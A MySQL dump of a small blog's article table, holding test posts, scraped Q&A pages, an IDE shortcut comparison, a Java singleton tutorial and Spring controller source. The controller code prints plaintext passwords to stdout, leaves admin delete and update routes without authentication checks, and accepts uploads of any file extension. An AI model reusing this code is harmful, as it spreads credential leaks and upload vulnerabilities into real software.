/*
SQLyog Ultimate v8.32 
MySQL - 5.7.20-log : Database - blog
*********************************************************************
*/

/*!40101 SET NAMES utf8 */;

/*!40101 SET SQL_MODE=''*/;

/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
CREATE DATABASE /*!32312 IF NOT EXISTS*/`blog` /*!40100 DEFAULT CHARACTER SET utf8 COLLATE utf8_bin */;

USE `blog`;

/*Table structure for table `article` */

DROP TABLE IF EXISTS `article`;

CREATE TABLE `article` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(128) DEFAULT NULL,
  `content` text,
  `categoryId` int(11) DEFAULT NULL,
  `summary` text,
  `date` varchar(64) DEFAULT NULL,
  `category_id` varchar(64) CHARACTER SET utf8 COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=utf8;

/*Data for the table `article` */

insert  into `article`(`id`,`title`,`content`,`categoryId`,`summary`,`date`,`category_id`) values (1,'测试一','e中提供了以下替换快捷键：\r\n\r\nalt+shift+l以及alt+shift+m：提取本地变量及方法\r\n\r\n源码处理还包括从大块的代码中提取变量和方法的功能。比如，要从一个string创建一个常量，那么就选定文本并按下alt+shift+l即可。如果同 一个string在同一类中的别处出现，它会被自动替换。方法提取也是个非常方便的功能。将大方法分解成较小的、充分定义的方法会极大的减少复杂度，并提 升代码的可测试性。\r\n\r\n本回答由电脑网络分类达人 汪正茂推荐\r\n举报| 答案纠错 | 评论 3 16\r\n\r\n千锋教育 | 做真实的自己 用良心做教育\r\n\r\n主营：教育培训-JAVA培训-大数据培训-Html5培训-UI培训-python培训等\r\n向TA提问\r\n其他回答\r\n使用refactor功能\r\n393107529 | 发布于2015-01-26\r\n举报| 评论(1) 1 1\r\n为您推荐：\r\n其他类似问题\r\n\r\n    2018-02-28 eclipse中的抽取方法是怎样的？ 22\r\n    2017-02-24 eclipse中怎么将方法抽取为一个类 1\r\n    2018-01-02 如何快速提取变量\r\n    2016-06-29 eclipse 把局部变量变为全局变量的快捷键 是哪个？ 80\r\n    2017-10-14 jquery 如何把变量转为常量 和 常量转为变量 1\r\n    2017-04-06 请教高手，怎样把一个变量拆分成几个变量\r\n    2016-04-08 C++怎么将一个变量变成常量 9\r\n    2016-12-24 eclipse 怎么看一个变量或者一个方法在哪里被调用过？ 60\r\n\r\n更多相关eclipse alt shift l的问题 >\r\n广告\r\n您可能关注的内容\r\n\r\n    Java教程-O基础入门到精通-在线大型直播公开课\r\n    we.tanzhouedu.com\r\n\r\n常量的相关知识\r\n\r\n    2010-11-20 常量与变量 131\r\n    2011-08-26 VB中常量如何定义？ 33\r\n    2010-06-04 c语言中形参可以是变量，常量，表达式？ 33\r\n    2009-04-29 c#常量中有换行符 3\r\n    2011-04-11 请教const 常量函数 23\r\n\r\n更多关于常量的知识 >\r\n正在求助\r\n换一换\r\n回答问题，赢新手礼包\r\n\r\n    苦等2分钟： 你们都是什么时候开始发现跟农村人难以共处的\r\n    回答\r\n    苦等14分钟： 穷山恶水出刁民还是大家好才是真的好\r\n    回答\r\n    苦等16分钟： gif表情包制作app哪个好  10\r\n    回答\r\n    苦等36分钟： 你们都是用什么记录仪呢有没有推荐的\r\n    回答\r\n    苦等42分钟： 男篮世预赛爆群殴/这究竟是怎么回事\r\n    回答\r\n    苦等47分钟： 修丽可CE精华有用过的大神吗？在考虑要不要入手。\r\n    回答\r\n\r\n更多等待求助问题 >\r\n登录\r\n\r\n还没有百度账号？\r\n立即注册\r\n知道日报\r\n全部文章\r\n为什么人会感到恶心？其实是进化...\r\n相关搜索\r\nxp下载xp系统下载百度账号\r\n\r\n精彩知识在知道\r\n\r\n    秒答知识分享大使招募啦！\r\n    【知道三农】上线了！\r\n    参与知道答题赢空调，清凉一夏\r\n\r\n',1,'e中提供了以下替换快捷键：\r\n\r\nalt','2018-07-27 21:17',NULL),(2,'测试二','花了几天时间熟悉IDEA的各种操作，将各种快捷键都试了一下，感觉很是不错！\r\n以下为我整理了一下开发过程中经常用的一些Eclipse快捷键与IDEA的对比，方便像我一样使用Eclipse多年但想尝试些改变的同学们。\r\n \r\n\r\n\r\n描述	Eclipse	Intellij\r\n代码补全	Ctrl+space	Ctrl+space\r\n\r\n打开类或者接口\r\n\r\n（两个IDE都支持使用“驼峰字符”前缀的方式来过滤查找列表，进而轻松完成搜索；比如：可\r\n\r\n以使用“PoDI”来检索PodcastDaoImpl类）\r\n	Ctrl+Shift +T	Ctrl+N\r\n快速打开文件/资源	Ctrl+Shift+R	Shift+F6\r\n打开声明	F3	Ctrl+B\r\n查看Javadoc/详情	鼠标滑过（F2聚焦）	\r\n\r\nCtrl+Q\r\n快速修复	Alt+1	Alt+Enter\r\n导入所有须要的包	Ctrl+Shift+O	Ctrl+Alt+O\r\n保存文件/保存所有文件	Ctrl+S/Ctrl+Shift+S	自动保存\r\n当前文件快速定位弹出框（成员，方法）	Ctrl+O	Ctrl+F12\r\n源码（生成getter和setter，构造器等）	Alt+Up /Alt+Down	Alt+Insert\r\n\r\n当前语法补全\r\n\r\nif，do-while，try-catch，return（方法调用）等正确的语法构造（如：添加括号）\r\n	 	Ctrl+Shift+Enter\r\n抽取常量	Ctrl+1->抽取常亮	Ctrl+Alt+C\r\n抽取变量	Ctrl+1->抽取变量	Ctrl+Alt+V\r\n增加、删除以及移动数行代码\r\n	 	 \r\n在当前插入符添加一行	Shift+Enter	Shift+Enter\r\n复制一行或代码段	Ctrl+Alt+Up/Down	Ctrl+D\r\n删除一行代码	Ctrl+Y	\r\n\r\nCtrl+Y\r\n	 \r\n选中代码向上或者向下移动	Alt+Up/Down	Shift+Alt+Up/Down\r\n查找/搜索	 	 \r\n查找类/变量在工作区域工程中使用	Ctrl+Shift+G	Alt+F7\r\n在工程或者工作区中查找文本	Ctrl+H (选择文件搜索)	Ctrl+Shift+F\r\n导航	 	 \r\n回退（撤消最后导航操作）	Alt+Left	Ctrl+Alt+Left\r\n标签/编辑之间的导航	Ctrl + Page Down / Up	Alt + Left/Alt + Right\r\n跳转某一行	Ctrl+L	Ctrl+G\r\n导航到最近的文件	Ctrl + E	Ctrl + E\r\n在编辑器之间快速切换方法	 	Alt + Up / Down\r\n调试	 	 \r\n运行一行	F6	F8\r\n进入下一次计算	F5	F7\r\n运行到下一个断点	F7	Shift+F8\r\n回复运行\r\n上一篇解决IntelliJ Idea中文乱码问题\r\n下一篇将SVN中的类重命名导致 ',1,'花了几天时间熟悉IDEA的各种操作，将各','2018-07-24 18:14',NULL),(3,'测试三','test',1,'test','2018-07-24 18:14',NULL),(4,'测试四','test2',1,'test2','2018-07-24 18:14',NULL),(5,'just test','e中提供了以下替换快捷键：\r\nalt+shift+l以及alt+shift+m：提取本地变量及方法\r\n源码处理还包括从大块的代码中提取变量和方法的功能。比如，要从一个string创建一个常量，那么就选定文本并按下alt+shift+l即可。如果同 一个string在同一类中的别处出现，它会被自动替换。方法提取也是个非常方便的功能。将大方法分解成较小的、充分定义的方法会极大的减少复杂度，并提 升代码的可测试性。\r\n\r\n本回答由电脑网络分类达人 汪正茂推荐\r\n举报| 答案纠错 | 评论 3 16\r\n\r\n千锋教育 | 做真实的自己 用良心做教育\r\n\r\n主营：教育培训-JAVA培训-大数据培训-Html5培训-UI培训-python培训等\r\n向TA提问\r\n其他回答\r\n使用refactor功能\r\n393107529 | 发布于2015-01-26\r\n举报| 评论(1) 1 1\r\n为您推荐：\r\n其他类似问题\r\n\r\n    2018-02-28 eclipse中的抽取方法是怎样的？ 22\r\n    2017-02-24 eclipse中怎么将方法抽取为一个类 1\r\n    2018-01-02 如何快速提取变量\r\n    2016-06-29 eclipse 把局部变量变为全局变量的快捷键 是哪个？ 80\r\n    2017-10-14 jquery 如何把变量转为常量 和 常量转为变量 1\r\n    2017-04-06 请教高手，怎样把一个变量拆分成几个变量\r\n    2016-04-08 C++怎么将一个变量变成常量 9\r\n    2016-12-24 eclipse 怎么看一个变量或者一个方法在哪里被调用过？ 60\r\n\r\n更多相关eclipse alt shift l的问题 >\r\n广告\r\n您可能关注的内容\r\n\r\n    Java教程-O基础入门到精通-在线大型直播公开课\r\n    we.tanzhouedu.com\r\n\r\n常量的相关知识\r\n\r\n    2010-11-20 常量与变量 131\r\n    2011-08-26 VB中常量如何定义？ 33\r\n    2010-06-04 c语言中形参可以是变量，常量，表达式？ 33\r\n    2009-04-29 c#常量中有换行符 3\r\n    2011-04-11 请教const 常量函数 23\r\n\r\n更多关于常量的知识 >\r\n正在求助\r\n换一换\r\n回答问题，赢新手礼包\r\n\r\n    苦等2分钟： 你们都是什么时候开始发现跟农村人难以共处的\r\n    回答\r\n    苦等14分钟： 穷山恶水出刁民还是大家好才是真的好\r\n    回答\r\n    苦等16分钟： gif表情包制作app哪个好  10\r\n    回答\r\n    苦等36分钟： 你们都是用什么记录仪呢有没有推荐的\r\n    回答\r\n    苦等42分钟： 男篮世预赛爆群殴/这究竟是怎么回事\r\n    回答\r\n    苦等47分钟： 修丽可CE精华有用过的大神吗？在考虑要不要入手。\r\n    回答\r\n\r\n更多等待求助问题 >\r\n登录\r\n\r\n还没有百度账号？\r\n立即注册\r\n知道日报\r\n全部文章\r\n为什么人会感到恶心？其实是进化...\r\n相关搜索\r\nxp下载xp系统下载百度账号\r\n\r\n精彩知识在知道\r\n\r\n    秒答知识分享大使招募啦！\r\n    【知道三农】上线了！\r\n    参与知道答题赢空调，清凉一夏\r\n\r\n',2,'e中提供了以下替换快捷键：\r\nalt+s','2018-07-19 16:08',NULL),(6,'测试五','花了几天时间熟悉IDEA的各种操作，将各种快捷键都试了一下，感觉很是不错！\r\n以下为我整理了一下开发过程中经常用的一些Eclipse快捷键与IDEA的对比，方便像我一样使用Eclipse多年但想尝试些改变的同学们。\r\n \r\n\r\n\r\n描述	Eclipse	Intellij\r\n代码补全	Ctrl+space	Ctrl+space\r\n\r\n打开类或者接口\r\n\r\n（两个IDE都支持使用“驼峰字符”前缀的方式来过滤查找列表，进而轻松完成搜索；比如：可\r\n\r\n以使用“PoDI”来检索PodcastDaoImpl类）\r\n	Ctrl+Shift +T	Ctrl+N\r\n快速打开文件/资源	Ctrl+Shift+R	Shift+F6\r\n打开声明	F3	Ctrl+B\r\n查看Javadoc/详情	鼠标滑过（F2聚焦）	\r\n\r\nCtrl+Q\r\n快速修复	Alt+1	Alt+Enter\r\n导入所有须要的包	Ctrl+Shift+O	Ctrl+Alt+O\r\n保存文件/保存所有文件	Ctrl+S/Ctrl+Shift+S	自动保存\r\n当前文件快速定位弹出框（成员，方法）	Ctrl+O	Ctrl+F12\r\n源码（生成getter和setter，构造器等）	Alt+Up /Alt+Down	Alt+Insert\r\n\r\n当前语法补全\r\n\r\nif，do-while，try-catch，return（方法调用）等正确的语法构造（如：添加括号）\r\n	 	Ctrl+Shift+Enter\r\n抽取常量	Ctrl+1->抽取常亮	Ctrl+Alt+C\r\n抽取变量	Ctrl+1->抽取变量	Ctrl+Alt+V\r\n增加、删除以及移动数行代码\r\n	 	 \r\n在当前插入符添加一行	Shift+Enter	Shift+Enter\r\n复制一行或代码段	Ctrl+Alt+Up/Down	Ctrl+D\r\n删除一行代码	Ctrl+Y	\r\n\r\nCtrl+Y\r\n	 \r\n选中代码向上或者向下移动	Alt+Up/Down	Shift+Alt+Up/Down\r\n查找/搜索	 	 \r\n查找类/变量在工作区域工程中使用	Ctrl+Shift+G	Alt+F7\r\n在工程或者工作区中查找文本	Ctrl+H (选择文件搜索)	Ctrl+Shift+F\r\n导航	 	 \r\n回退（撤消最后导航操作）	Alt+Left	Ctrl+Alt+Left\r\n标签/编辑之间的导航	Ctrl + Page Down / Up	Alt + Left/Alt + Right\r\n跳转某一行	Ctrl+L	Ctrl+G\r\n导航到最近的文件	Ctrl + E	Ctrl + E\r\n在编辑器之间快速切换方法	 	Alt + Up / Down\r\n调试	 	 \r\n运行一行	F6	F8\r\n进入下一次计算	F5	F7\r\n运行到下一个断点	F7	Shift+F8\r\n回复运行\r\n上一篇解决IntelliJ Idea中文乱码问题\r\n下一篇将SVN中的类重命名导致 ',2,'花了几天时间熟悉IDEA的各种操作，将各','2018-07-24 18:15',NULL),(7,'测试六','testtest\r\ntest\r\n```java\r\npackage org.sang.controller;\r\n\r\nimport org.sang.entity.Article;\r\nimport org.sang.entity.Category;\r\nimport org.sang.entity.User;\r\nimport org.sang.service.ArticleService;\r\nimport org.sang.service.UserService;\r\nimport org.springframework.stereotype.Controller;\r\nimport org.springframework.ui.Model;\r\nimport org.springframework.web.bind.annotation.PathVariable;\r\nimport org.springframework.web.bind.annotation.RequestMapping;\r\nimport org.springframework.web.bind.annotation.RequestMethod;\r\nimport org.tautua.markdownpapers.Markdown;\r\nimport org.tautua.markdownpapers.parser.ParseException;\r\n\r\nimport javax.annotation.Resource;\r\nimport javax.servlet.http.HttpServletRequest;\r\nimport java.io.*;\r\nimport java.util.List;\r\n\r\n/**\r\n * Created by sang on 17-3-8.\r\n */\r\n@Controller\r\npublic class ArticleController {\r\n    @Resource\r\n    private ArticleService articleService;\r\n    @Resource\r\n    private UserService userService;\r\n\r\n    @RequestMapping(\"/\")\r\n    public String index(Model model) {\r\n        List<Article> articles = articleService.getFirst10Article();\r\n        for (Article article : articles) {\r\n            System.out.println(article.getCategory());\r\n        }\r\n        model.addAttribute(\"articles\", articles);\r\n        return \"views/index\";\r\n    }\r\n\r\n    @RequestMapping(\"/column/{displayName}/{category}\")\r\n    public String column(@PathVariable(\"category\") String category,Model model,@PathVariable(\"displayName\") String displayName) {\r\n        model.addAttribute(\"articles\", articleService.getArticlesByCategoryName(category));\r\n        model.addAttribute(\"displayName\", displayName);\r\n        return \"views/columnPage\";\r\n    }\r\n\r\n    @RequestMapping(\"/detail/{id}/{category}\")\r\n    public String detail(@PathVariable(\"id\") Long id, Model model) {\r\n        Article article = articleService.getArticleById(id);\r\n        System.out.println(article.getContent());\r\n        Markdown markdown = new Markdown();\r\n        try {\r\n            StringWriter out = new StringWriter();\r\n            markdown.transform(new StringReader(article.getContent()), out);\r\n            out.flush();\r\n            article.setContent(out.toString());\r\n            System.out.println(\"------------------\");\r\n            System.out.println(article.getContent());\r\n        } catch (ParseException e) {\r\n            e.printStackTrace();\r\n        }\r\n        model.addAttribute(\"article\", article);\r\n        return \"views/detail\";\r\n    }\r\n\r\n    @RequestMapping(\"/sang\")\r\n    public String admin(Model model) {\r\n        List<Article> first10Article = articleService.getFirst10Article();\r\n        System.out.println(first10Article);\r\n        model.addAttribute(\"articles\",first10Article );\r\n        return \"admin/index\";\r\n    }\r\n\r\n    @RequestMapping(\"/sang/login\")\r\n    public String login() {\r\n        return \"admin/login\";\r\n    }\r\n\r\n    @RequestMapping(value = \"/sang/dologin\", method = RequestMethod.POST)\r\n    public String doLogin(HttpServletRequest request, User user, Model model) {\r\n        System.out.println(\"user.getUsername():\" + user.getUsername() + \";user.getPassword():\" + user.getPassword());\r\n        if (userService.login(user.getUsername(), user.getPassword())) {\r\n            request.getSession().setAttribute(\"user\", user);\r\n            model.addAttribute(\"user\", user);\r\n            return \"redirect:/sang\";\r\n        } else {\r\n            model.addAttribute(\"error\", \"用户名或密码错误\");\r\n            return \"admin/login\";\r\n        }\r\n    }\r\n\r\n//    private String returnAdminIndex(Model model) {\r\n//        model.addAttribute(\"articles\", articleService.getFirst10Article());\r\n//        return \"redirect:/sang\";\r\n//    }\r\n\r\n    @RequestMapping(method = RequestMethod.GET, value = \"/sang/dologin\")\r\n    public String doLogin(HttpServletRequest request, Model model) {\r\n        if (request.getSession().getAttribute(\"user\") == null) {\r\n            return \"admin/login\";\r\n        }\r\n        return \"redirect:/sang\";\r\n    }\r\n\r\n    @RequestMapping(\"/sang/write\")\r\n    public String write(Model model) {\r\n        List<Category> categories = articleService.getCategories();\r\n        categories.remove(0);\r\n        model.addAttribute(\"categories\", categories);\r\n        return \"admin/write\";\r\n    }\r\n\r\n    @RequestMapping(value = \"/sang/write\", method = RequestMethod.POST)\r\n    public String write(Article article) {\r\n        if (article.getId() == 0l) {\r\n            articleService.writeBlog(article);\r\n        } else {\r\n            articleService.updateBlog(article);\r\n        }\r\n        return \"redirect:/sang\";\r\n    }\r\n\r\n    @RequestMapping(\"/sang/delete/{id}\")\r\n    public String delete(@PathVariable(\"id\") Long id) {\r\n        articleService.deleteArticleById(id);\r\n        return \"redirect:/sang\";\r\n    }\r\n\r\n    @RequestMapping(\"/sang/update/{id}\")\r\n    public String update(@PathVariable(\"id\") Long id, Model model) {\r\n        Article article = articleService.getArticleById(id);\r\n        model.addAttribute(\"article\", article);\r\n        return \"admin/write\";\r\n    }\r\n}\r\n\r\n```test\r\ntest\r\ntest\r\ntest\r\ntest\r\ntest\r\ntest\r\ntest\r\n**\r\ntest\r\nv**\r\ntest',2,'testtest\r\ntest\r\n```j','2018-07-24 18:15',NULL),(8,'test','test:editormd-logo-8x:',3,'test:editormd-logo-8','2018-07-28 14:02',NULL),(9,'test',':editormd-logo-2x::fa-film:test',3,':editormd-logo-2x::f','2018-07-28 14:03',NULL),(10,'test',':tw-1f308::satisfied:just a test ,\r\n------------:editormd-logo-8x:\r\n\r\n:editormd-logo-2x::sunglasses:\r\naa\r\n&\r\n\r\n\r\n------------\r\n\r\n\r\n------------\r\n\r\n\r\n------------\r\n\r\n\r\n------------\r\n\r\n1. - \r\n[========]\r\n2018-07-28 15:43:39 星期六\r\n|   |   |   |   |\r\n| ------------ | ------------ | ------------ | ------------ |\r\n|   |   |   |   |\r\n|   |   |   |   |\r\n|   |   |   |   |\r\n[[1]][http://localhost:8765/static/editormd/plugins/emoji-dialog/emoji/smile.png]\r\n[http://localhost:8765/static/editormd/plugins/emoji-dialog/emoji/smile.png]: http://localhost:8765/static/editormd/plugins/emoji-dialog/emoji/smile.png \"test\"',3,':tw-1f308::satisfied','2018-07-29 13:50',NULL),(11,'test','![test](/assets/upload/akimg1532849684470.gif \"test\"):heart_eyes::editormd-logo-8x:\r\n# ArticleController\r\n```java\r\npackage org.ak.controller;\r\n\r\nimport org.ak.entity.Article;\r\nimport org.ak.entity.Category;\r\nimport org.ak.entity.Page;\r\nimport org.ak.entity.User;\r\nimport org.ak.service.ArticleService;\r\nimport org.ak.service.UserService;\r\nimport org.springframework.stereotype.Controller;\r\nimport org.springframework.ui.Model;\r\nimport org.springframework.web.bind.annotation.PathVariable;\r\nimport org.springframework.web.bind.annotation.RequestMapping;\r\nimport org.springframework.web.bind.annotation.RequestMethod;\r\nimport org.springframework.web.bind.annotation.RequestParam;\r\nimport org.springframework.web.bind.annotation.ResponseBody;\r\nimport org.springframework.web.multipart.MultipartFile;\r\nimport org.tautua.markdownpapers.Markdown;\r\nimport org.tautua.markdownpapers.parser.ParseException;\r\n\r\nimport javax.annotation.Resource;\r\nimport javax.servlet.http.HttpServletRequest;\r\nimport java.io.*;\r\nimport java.util.*;\r\n\r\n\r\n@Controller\r\npublic class ArticleController {\r\n    @Resource\r\n    private ArticleService articleService;\r\n    @Resource\r\n    private UserService userService;\r\n\r\n   @RequestMapping(\"/\")\r\n    public String indexPage() {\r\n        return \"views/index\";\r\n    }\r\n\r\n    @RequestMapping(\"/column/{displayName}/{category}\")\r\n    public String column(@PathVariable(\"category\") String category,Model model,@PathVariable(\"displayName\") String displayName) {\r\n        model.addAttribute(\"articles\", articleService.getArticlesByCategoryName(category));\r\n        model.addAttribute(\"displayName\", displayName);\r\n        return \"views/columnPage\";\r\n    }\r\n\r\n    @RequestMapping(\"/detail/{id}/{category}\")\r\n    public String detail(@PathVariable(\"id\") Long id, Model model) {\r\n        Article article = articleService.getArticleById(id);\r\n        System.out.println(article.getContent());\r\n        Markdown markdown = new Markdown();\r\n        try {\r\n            StringWriter out = new StringWriter();\r\n            markdown.transform(new StringReader(article.getContent()), out);\r\n            out.flush();\r\n            article.setContent(out.toString());\r\n            System.out.println(\"------------------\");\r\n            System.out.println(article.getContent());\r\n        } catch (ParseException e) {\r\n            e.printStackTrace();\r\n        }\r\n        model.addAttribute(\"article\", article);\r\n        return \"views/detail\";\r\n    }\r\n\r\n    @RequestMapping(\"/my\")\r\n    public String admin(Model model) {\r\n        List<Article> first10Article = articleService.getFirst10Article();\r\n        //System.out.println(first10Article);\r\n        model.addAttribute(\"articles\",first10Article );\r\n        return \"admin/index\";\r\n    }\r\n\r\n    @RequestMapping(\"/my/login\")\r\n    public String login() {\r\n        return \"admin/login\";\r\n    }\r\n\r\n    @RequestMapping(value = \"/my/dologin\", method = RequestMethod.POST)\r\n    public String doLogin(HttpServletRequest request, User user, Model model) {\r\n        System.out.println(\"user.getUsername():\" + user.getUsername() + \";user.getPassword():\" + user.getPassword());\r\n        if (userService.login(user.getUsername(), user.getPassword())) {\r\n            request.getSession().setAttribute(\"user\", user);\r\n            model.addAttribute(\"user\", user);\r\n            return \"redirect:/my\";\r\n        } else {\r\n            model.addAttribute(\"error\", \"用户名或密码错误\");\r\n            return \"admin/login\";\r\n        }\r\n    }\r\n\r\n    @RequestMapping(method = RequestMethod.GET, value = \"/my/dologin\")\r\n    public String doLogin(HttpServletRequest request, Model model) {\r\n        if (request.getSession().getAttribute(\"user\") == null) {\r\n            return \"admin/login\";\r\n        }\r\n        return \"redirect:/my\";\r\n    }\r\n\r\n    @RequestMapping(\"/my/write\")\r\n    public String write(Model model) {\r\n        List<Category> categories = articleService.getCategories();\r\n        categories.remove(0);\r\n        model.addAttribute(\"categories\", categories);\r\n        return \"admin/write\";\r\n    }\r\n\r\n    @RequestMapping(value = \"/my/write\", method = RequestMethod.POST)\r\n    public String write(Article article) {\r\n        if (article.getId() == 0l) {\r\n            articleService.writeBlog(article);\r\n        } else {\r\n            articleService.updateBlog(article);\r\n        }\r\n        return \"redirect:/my\";\r\n    }\r\n\r\n    @RequestMapping(\"/my/delete/{id}\")\r\n    public String delete(@PathVariable(\"id\") Long id) {\r\n        articleService.deleteArticleById(id);\r\n        return \"redirect:/my\";\r\n    }\r\n\r\n    @RequestMapping(\"/my/update/{id}\")\r\n    public String update(@PathVariable(\"id\") Long id, Model model) {\r\n        Article article = articleService.getArticleById(id);\r\n        model.addAttribute(\"article\", article);\r\n        return \"admin/write\";\r\n    }\r\n\r\n    @RequestMapping(\"/uploaded\")\r\n    public @ResponseBody Map<String,Object> demo(@RequestParam(value = \"editormd-image-file\", required = false) MultipartFile file, HttpServletRequest request) {\r\n        System.out.println(\"上传\");\r\n        Map<String,Object> resultMap = new HashMap<String,Object>();\r\n        String realPath = request.getRealPath(\"/\")+\"assets/upload/\";\r\n\r\n        // 获取原始的文件名\r\n        String filename = file.getOriginalFilename();\r\n\r\n        // 获取扩展文件名\r\n        String extName = filename.substring(filename.lastIndexOf(\".\")+1);\r\n\r\n        // 创建新的文件名\r\n        Calendar calendar = Calendar.getInstance();\r\n        String newFileName = \"akimg\"+calendar.getTimeInMillis()+\".\"+extName;\r\n\r\n        File targetFile = new File(realPath, newFileName);\r\n        if(!targetFile.exists()){\r\n            targetFile.mkdirs();\r\n        }\r\n        //保存\r\n        try { file.transferTo(targetFile);\r\n            resultMap.put(\"success\", 1);\r\n            resultMap.put(\"message\", \"上传成功！\");\r\n            resultMap.put(\"url\",request.getContextPath()+\"/assets/upload/\"+newFileName);\r\n        } catch (Exception e) {\r\n            resultMap.put(\"success\", 0);\r\n            resultMap.put(\"message\", \"上传失败！\");\r\n            e.printStackTrace();\r\n        }\r\n        return resultMap;\r\n    }\r\n}\r\n\r\n```',3,'![test](/assets/uplo','2018-07-29 15:37',NULL),(12,'just a test page2',':satisfied:![啊啊啊](/static/upload/thenewimg1532930609470.png \"啊啊啊\"):editormd-logo-8x::flushed:![test](/static/upload/thenewimg1532924237330.jpg \"test\")\r\n![11111111](/static/upload/thenewimg1532930997470.jpg \"11111111\")\r\n\r\n',2,':satisfied:![啊啊啊](/s','2018-07-30 14:10',NULL),(13,'just a test page3','![gtx](/static/upload/thenewimg1533093542251.jpg \"gtx\")![6666666666666](/assets/upload/akimg1532846818443.gif \"6666666666666\")[![啦啦啦啦啦啦啦啦啦啦啦啦](/assets/upload/akimg1532848334223.jpg \"啦啦啦啦啦啦啦啦啦啦啦啦\")](http://啦啦啦啦啦啦啦啦啦啦啦啦来了 \"啦啦啦啦啦啦啦啦啦啦啦啦\")[![举个栗子](/assets/upload/1.png \"举个栗子\")](http://localhost:8765/assets/upload/1.png \"举个栗子\")![](/assets/upload/1.png):satisfied::satisfied:1',3,'![gtx](/static/uploa','2018-08-01 11:19',NULL),(23,'面向对象软件设计模式（一）- 单例模式','面向对象软件设计模式中的经典模式-单例模式',0,'## 前言\r\n单例(Singleton)应该是开发者们最熟悉的设计模式了，并且好像也是最容易实现的——基本上每个开发者都能够随手写出——但是，真的是这样吗？\r\n作为一个Java开发者，也许你觉得自己对单例模式的了解已经足够多了。我并不想危言耸听说一定还有你不知道的——毕竟我自己的了解也的确有限，但究竟你自己了解的程度到底怎样呢？往下看，我们一起来聊聊看~\r\n\r\n## 什么是单例？\r\n单例对象的类必须保证只有一个实例存在——这是维基百科上对单例的定义，这也可以作为对意图实现单例模式的代码进行检验的标准。\r\n>* 保证一个类仅有一个实例， 并提供一个访问它的全局访问点。让类自身负责保存它的唯一实例。\r\n>* 这个类可以保证没有其他实例可以被创建（通过截取创建新对象的请求 ）， 并且它可以提供一个访问该实例的方法\r\n\r\n## 实例\r\n\r\n> 在一部电影中，导演的作用是至关重要的，通常一部电影只有一个总导演。在电影的拍摄过程中，可能会设计多个片场，导演需要对不同的演员进行分别指导，但所有演员导演都是同一个人，“把导演叫过来” 这个过程可以视为单例模式获取实例的过程\r\n\r\n## 模式分析\r\n\r\n> 先来看最简单的写法\r\n\r\n```\r\npublic class Single {\r\n    private static Single instance;\r\n    public static Single getInstance() {\r\n        if (instance == null) {\r\n            instance = new Single();\r\n        }\r\n        return instance;\r\n    }\r\n} \r\n```\r\n\r\n> 稍作修改，把构造器改为私有的，防止被外部的类调用\r\n\r\n```\r\npublic class Singleton {\r\n    private static Singleton instance;\r\n    private Singleton() {}\r\n    public static Singleton getInstance() {\r\n        if (instance == null) {\r\n            instance = new Singleton();\r\n        }\r\n        return instance;\r\n    }\r\n}\r\n```\r\n\r\n> 每次获取实例对象之前先进行判空，如果对象为 null 则实例化一个 instance，如果存在则直接返回该实例。这种方法表面上看是完美的，仿佛实例只存在一个。但是，在多线程运行的时候，如果两个不同的线程同时运行到判空操作，会各自分别创建一个实例，这样一来，这种方法就不是单例了\r\n\r\n> 在 getInstance() 方法上添加 synchronized 关键字\r\n\r\n```\r\npublic class Singleton {\r\n    private static Singleton instance;\r\n    private Singleton() {}\r\n    public static synchronized Singleton getInstance() {\r\n        if (instance == null) {\r\n            instance = new Singleton();\r\n        }\r\n        return instance;\r\n    }\r\n} \r\n```\r\n> 这样写保证了 getInstance 方法同一时刻只会有一个线程执行，但是这样做会使得除了执行这个方法的线程顺利执行外，其他所有线程都要等待，这会造成极大的系统开销，降低了程序的运行效率\r\n\r\n> 这种方法代价过高，因为无论 instance 是否为 null ,每次执行时，整个方法都加上了锁，我们不妨将锁的范围尽可能的缩小，把对性能的影响降到最低，于是有了如下写法\r\n\r\n```\r\npublic class Singleton {\r\n    private static Singleton instance;\r\n    private Singleton() {}\r\n    public static Singleton getInstance() {\r\n        if (instance == null) {\r\n            synchronized (Singleton.class) {\r\n                if (instance == null) {\r\n                    instance = new Singleton();\r\n                }\r\n            }\r\n        }\r\n        return instance;\r\n    }\r\n} \r\n```\r\n> 只有当 instance 为 null 的时候才执行同步代码块，二次判空保证了不会产生多个实例\r\n\r\n> 这样看似没问题了，但是在计算机中，有时为了提高运行效率，会对指令进行重拍，比如\r\n\r\n```\r\nint a;      //语句 A\r\na = 3;      //语句 B\r\nint b = 5;      //语句 C\r\nint c = a + b;  //语句 D\r\n```\r\n> 可能会被重排成 A-C-B-D 或者 C-A-B-D\r\n>\r\n> 语句 C 和语句 D 不具备原子性，因此也有可能被重排\r\n> getInstance 操作如果被重排，那么 instance 会存在一种 “不为 null 但是仍然未被初始化” 的状态，即已经给 instance 分配了内存空间但是并没有调用 Singleton 的构造方法来初始化 instance，执行判空的线程抢在了初始化的操作完成之前，则直接返回 instance 肯定会报错\r\n> \r\n> 于是有了最终版本，添加 volatile 关键字\r\n\r\n```\r\npublic class Singleton {\r\n    private static volatile Singleton instance;\r\n    private Singleton() {}\r\n    public static Singleton getInstance() {\r\n        if (instance == null) {\r\n            synchronized (Singleton.class) {\r\n                if (instance == null) {\r\n                    instance = new Singleton();\r\n                }\r\n            }\r\n        }\r\n        return instance;\r\n    }\r\n} \r\n```\r\n> volatile 关键字具有屏蔽指令重排的功能，即对 instance 加上了一把锁，在完成写操作之前不会允许其他线程进行读操作，因此，在初始化完成前，无法对其进行读操作\r\n\r\n> 枚举类型是线程安全的，因此采用枚举类作为单例模式的一种实现是非常方便的\r\n\r\n```\r\npublic enum Singleton {\r\n    INSTANCE;\r\n}\r\n```\r\n\r\n> 通过枚举类获取单例的实例\r\n```\r\nSingleton result = Singleton.INSTANCE;\r\n```\r\n\r\n### 知识点：什么时候是类装载时？\r\n\r\n> 前面提到了单例在类装载时被实例化，那究竟什么时候才是『类装载时』呢？\r\n\r\n> 不严格的说，大致有这么几个条件会触发一个类被加载：\r\n> 1. new一个对象时\r\n> 2. 